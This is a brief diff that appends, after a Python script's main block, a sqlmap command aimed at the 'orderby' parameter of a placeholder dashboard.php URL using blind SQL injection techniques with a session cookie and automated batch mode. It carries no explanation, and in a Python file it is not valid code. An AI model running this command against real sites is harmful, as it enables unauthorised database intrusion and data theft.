@@ -234,3 +234,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
+
+sqlmap -u "http://example.com/dashboard.php?orderby=submission_time&order=DESC" --cookie="PHPSESSID=your_token" -p orderby --technique=TB --level=3 --risk=2 --dbms=mysql --batch
